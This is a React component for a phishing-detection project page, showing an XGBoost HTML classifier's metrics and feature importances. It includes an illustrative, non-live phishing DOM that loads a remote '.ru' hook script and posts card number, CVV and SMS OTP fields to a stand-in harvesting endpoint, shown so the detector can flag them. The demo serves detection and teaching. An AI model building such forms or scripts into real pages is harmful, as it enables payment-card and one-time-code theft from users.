import React, { useState } from 'react';
import { SectionHeader } from '../components/SectionHeader';
import { AnimatedMetric } from '../components/AnimatedMetric';
import { HTML_FEATURE_IMPORTANCES } from '../data/projectData';
import { Code2, BarChart2 } from 'lucide-react';

export const Section06HTMLModel: React.FC = () => {
  const [xrayActive, setXrayActive] = useState(false);
  const [selectedFeature, setSelectedFeature] = useState<string | null>(HTML_FEATURE_IMPORTANCES[0].feature);

  return (
    <section id="html-ai" className="py-2 sm:py-4 md:py-6 px-4 md:px-8 max-w-7xl mx-auto w-full">
      <SectionHeader
        number="06"
        tag="Deep Structural Inspection"
        title="HTML Intelligence Model"
        subtitle="Gradient Boosted Decision Trees (XGBoost) parsing 56 structural and security DOM vectors to expose deceptive page architecture."
      />

      {/* Model Benchmark Grid */}
      <div className="grid grid-cols-2 lg:grid-cols-4 gap-4 mb-12">
        <AnimatedMetric
          value={96}
          suffix="%"
          label="XGBOOST ACCURACY"
          subtext="High fidelity DOM classification"
          highlightColor="text-emerald-400"
        />
        <AnimatedMetric
          value={0.9910}
          decimals={4}
          label="ROC-AUC SCORE"
          subtext="Precision-calibrated detection"
          highlightColor="text-cyan-400"
        />
        <AnimatedMetric
          value={56}
          label="DOM SECURITY FEATURES"
          subtext="External domain, script & form vectors"
          highlightColor="text-slate-100"
        />
        <AnimatedMetric
          value={498255}
          label="CORPUS TRAINING ROWS"
          subtext="Disjoint PhreshPhish benchmark"
          highlightColor="text-slate-100"
        />
      </div>

      {/* DOM X-Ray Simulator & Feature Importance Chart */}
      <div className="grid grid-cols-1 lg:grid-cols-12 gap-8 items-start mb-12">
        
        {/* Left: DOM X-Ray View */}
        <div className="lg:col-span-6 cyber-panel p-6 md:p-8 rounded-2xl border border-slate-800 bg-slate-950/90 flex flex-col justify-between">
          <div>
            <div className="flex items-center justify-between pb-4 border-b border-slate-800 mb-6">
              <div className="flex items-center gap-2">
                <Code2 className="w-4 h-4 text-emerald-400" />
                <span className="font-mono text-xs uppercase tracking-wider text-slate-300">
                  DOM Structure X-Ray Chamber
                </span>
              </div>
              <button
                onClick={() => setXrayActive(!xrayActive)}
                className="px-3 py-1 rounded-lg bg-emerald-500/10 border border-emerald-500/30 text-emerald-400 text-xs font-mono font-medium hover:bg-emerald-500/20 cursor-pointer transition-all"
              >
                {xrayActive ? 'SHOW CLEAN DOM' : 'ENGAGE SECURITY X-RAY'}
              </button>
            </div>

            {/* Simulated DOM Tree View */}
            <div className="font-mono text-xs p-4 rounded-xl bg-slate-900 border border-slate-800 space-y-2 overflow-x-auto text-slate-300">
              <div className="text-slate-500">&lt;html lang=&quot;en&quot;&gt;</div>
              <div className="pl-4 text-slate-500">&lt;head&gt;</div>
              <div className={`pl-8 py-1 px-2 rounded transition-all ${xrayActive ? 'bg-red-500/20 text-red-300 border border-red-500/30' : ''}`}>
                &lt;script src=&quot;https://cdn-unverified-tracker.ru/hook.js&quot;&gt;&lt;/script&gt;
                {xrayActive && <span className="ml-2 text-[10px] text-red-400">[ANOMALY: Remote Script]</span>}
              </div>
              <div className="pl-4 text-slate-500">&lt;/head&gt;</div>
              <div className="pl-4 text-slate-500">&lt;body&gt;</div>
              
              {/* Form Node */}
              <div className={`pl-8 py-1.5 px-2 rounded transition-all ${xrayActive ? 'bg-amber-500/20 text-amber-200 border border-amber-500/30' : ''}`}>
                &lt;form action=&quot;https://harvest-endpoint.site/auth&quot; method=&quot;POST&quot;&gt;
                {xrayActive && <div className="text-[10px] text-amber-400 mt-0.5">↳ HIGH RISK: External Form Destination Mismatch</div>}
                
                <div className="pl-4 text-slate-400 mt-1">
                  &lt;input name=&quot;pan_number&quot; type=&quot;text&quot; /&gt;<br />
                  &lt;input name=&quot;card_cvv&quot; type=&quot;password&quot; /&gt;<br />
                  &lt;input name=&quot;sms_otp&quot; type=&quot;text&quot; /&gt;
                </div>
              </div>

              <div className="pl-4 text-slate-500">&lt;/body&gt;</div>
              <div className="text-slate-500">&lt;/html&gt;</div>
            </div>
          </div>

          <div className="mt-6 pt-4 border-t border-slate-800 text-xs font-mono text-slate-400 flex items-center justify-between">
            <span>DISCOVERED ANOMALIES: {xrayActive ? '3 CRITICAL' : 'STANDBY'}</span>
            <span className="text-emerald-400">56 VECTORS EXTRACTED</span>
          </div>
        </div>

        {/* Right: Empirical Feature Importance Rankings */}
        <div className="lg:col-span-6 cyber-panel p-6 md:p-8 rounded-2xl border border-slate-800 bg-slate-950/90">
          <div className="flex items-center justify-between pb-4 border-b border-slate-800 mb-6">
            <div className="flex items-center gap-2">
              <BarChart2 className="w-4 h-4 text-cyan-400" />
              <span className="font-mono text-xs uppercase tracking-wider text-slate-300">
                Top Observed Feature Importances
              </span>
            </div>
            <span className="text-[10px] font-mono px-2 py-0.5 rounded bg-cyan-500/10 text-cyan-400">
              XGBOOST GAIN WEIGHTS
            </span>
          </div>

          <div className="space-y-3">
            {HTML_FEATURE_IMPORTANCES.map((item, index) => {
              const percent = (item.importance / HTML_FEATURE_IMPORTANCES[0].importance) * 100;
              const isSelected = selectedFeature === item.feature;

              return (
                <div
                  key={item.feature}
                  onClick={() => setSelectedFeature(item.feature)}
                  className={`p-2.5 rounded-xl border cursor-pointer transition-all ${
                    isSelected
                      ? 'bg-emerald-500/10 border-emerald-500/40 text-white'
                      : 'bg-slate-900/40 border-slate-800/80 text-slate-300 hover:bg-slate-800/50'
                  }`}
                >
                  <div className="flex items-center justify-between text-xs font-mono mb-1.5">
                    <span className="font-semibold text-slate-200">
                      {index + 1}. {item.feature}
                    </span>
                    <span className="text-emerald-400 font-mono">
                      {item.importance.toFixed(6)}
                    </span>
                  </div>

                  <div className="w-full bg-slate-800 h-1.5 rounded-full overflow-hidden">
                    <div
                      className="bg-gradient-to-r from-emerald-500 to-cyan-400 h-full rounded-full transition-all duration-700"
                      style={{ width: `${percent}%` }}
                    />
                  </div>

                  {isSelected && (
                    <div className="text-[11px] font-sans text-slate-400 mt-2 pt-2 border-t border-slate-800/60 leading-relaxed">
                      {item.description}
                    </div>
                  )}
                </div>
              );
            })}
          </div>
        </div>

      </div>
    </section>
  );
};
